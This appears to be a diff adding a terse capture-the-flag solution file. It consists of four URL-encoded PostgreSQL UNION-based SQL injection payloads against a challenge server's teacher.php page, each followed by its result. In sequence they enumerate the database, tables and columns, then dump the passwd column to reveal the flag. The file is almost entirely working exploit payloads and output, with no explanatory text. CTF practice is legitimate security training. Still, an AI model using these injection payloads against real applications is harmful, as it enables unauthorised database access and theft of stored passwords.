@@ -1,0 +1,12 @@
+http://chal.kaibro.tw:29487/teacher.php?op=s2&td=wangg%27%20union%20select%20null,null,null,null,null,null,null,null,null,datname,null,null%20from%20pg_database%20limit%201%20offset%201--+
+cei8a
+
+http://chal.kaibro.tw:29487/teacher.php?op=s2&td=wangg%27%20union%20select%20null,null,null,null,null,null,null,null,null,tablename,null,null%20from%20pg_tables--+
+teacher
+
+http://chal.kaibro.tw:29487/teacher.php?op=s2&td=wangg%27%20union%20select%20null,null,null,null,null,null,null,null,null,column_name,null,null%20from%20information_schema.columns where table_name='teacher'%20limit%201%20offset%205--+
+passwd
+
+http://chal.kaibro.tw:29487/teacher.php?op=s2&td=wangg%27%20union%20select%20null,null,null,null,null,null,null,null,null,passwd,null,null%20from%20teacher--+
+FLAG{Easy_blacbox_postgresql_injection:)}
+
